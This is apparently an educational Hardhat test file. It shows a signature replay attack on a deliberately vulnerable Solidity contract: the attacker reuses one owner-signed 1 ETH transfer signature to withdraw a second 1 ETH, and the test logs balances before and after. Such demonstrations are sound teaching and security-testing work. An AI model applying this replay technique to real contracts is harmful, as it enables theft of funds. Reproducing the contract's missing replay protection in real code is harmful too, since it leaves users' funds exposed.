import type { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import chai, { expect } from "chai";
import chaiAsPromised from "chai-as-promised";
import { ethers } from "hardhat";

import { SignatureReplayVulnerable } from "../typechain-types";

chai.use(chaiAsPromised);

describe("SignatureReplay", () => {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let signatureReplayVulnerable: SignatureReplayVulnerable;

    before(async () => {
        [deployer, attacker] = await ethers.getSigners();

        const SignatureReplayVulnerable = await ethers.getContractFactory("SignatureReplayVulnerable");
        signatureReplayVulnerable = await SignatureReplayVulnerable.deploy();
        await signatureReplayVulnerable.deployed();

        await signatureReplayVulnerable.deposit({ value: ethers.utils.parseEther("10") });
    });

    it("should be vulnerable to signature replay", async () => {
        console.log("Attacker Eth balance before hack: ", ethers.utils.formatEther(await attacker.getBalance()));
        console.log(
            "Vulnerable contract Eth balance before hack: ",
            ethers.utils.formatEther(await ethers.provider.getBalance(signatureReplayVulnerable.address))
        );

        console.log("...");
        console.log("Owner creates a signature for the attacker to transfer 1 ETH...");
        const message = await signatureReplayVulnerable.getTxHash(attacker.address, ethers.utils.parseEther("1"));
        const signature = await deployer.signMessage(ethers.utils.arrayify(message));

        console.log("...");
        console.log("Attacker correctly submits the signature to transfer 1 ETH...");
        await expect(signatureReplayVulnerable.connect(attacker).transfer(attacker.address, ethers.utils.parseEther("1"), signature)).to.changeEtherBalance(
            attacker,
            ethers.utils.parseEther("1")
        );

        console.log("...");
        console.log("Attacker Eth balance after correct transfer: ", ethers.utils.formatEther(await attacker.getBalance()));
        console.log(
            "Vulnerable contract Eth balance after correct transfer: ",
            ethers.utils.formatEther(await ethers.provider.getBalance(signatureReplayVulnerable.address))
        );

        console.log("...");
        console.log("Attacker submits the same signature to replay the transaction and get another 1 ETH...");
        await expect(signatureReplayVulnerable.connect(attacker).transfer(attacker.address, ethers.utils.parseEther("1"), signature)).to.changeEtherBalance(
            attacker,
            ethers.utils.parseEther("1")
        );

        console.log("...");
        console.log("Attacker Eth balance after replay: ", ethers.utils.formatEther(await attacker.getBalance()));
        console.log(
            "Vulnerable contract Eth balance after replay: ",
            ethers.utils.formatEther(await ethers.provider.getBalance(signatureReplayVulnerable.address))
        );
    });
});
